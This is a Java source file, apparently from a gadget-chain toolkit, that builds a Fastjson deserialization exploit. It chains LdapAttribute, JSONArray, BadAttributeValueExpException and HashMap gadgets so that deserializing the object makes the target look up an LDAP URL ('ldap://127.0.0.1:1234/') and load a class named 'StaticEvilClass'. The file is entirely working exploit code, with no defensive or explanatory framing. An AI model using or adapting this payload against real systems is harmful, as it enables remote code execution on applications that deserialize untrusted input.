import common.Util;
import gadgets.*;

public class Fastjson4_LdapAttribute {

    public Object getObject ( String baseCtxURL,String rdn) throws Exception {

        Object node1 = LdapAttributeNode.makeGadget(baseCtxURL,rdn);
        Object node2 = JsonArrayNode.makeGadget(2,node1);
        Object node3 = BadAttrValExeNode.makeGadget(node2);
        Object[] array = new Object[]{node1,node3};
        Object node4 = HashMapNode.makeGadget(array);
        return node4;
    }

    public static void main(String[] args) throws Exception {
        Object object = new Fastjson4_LdapAttribute().getObject("ldap://127.0.0.1:1234/","StaticEvilClass");
        Util.runGadgets(object);
    }
}
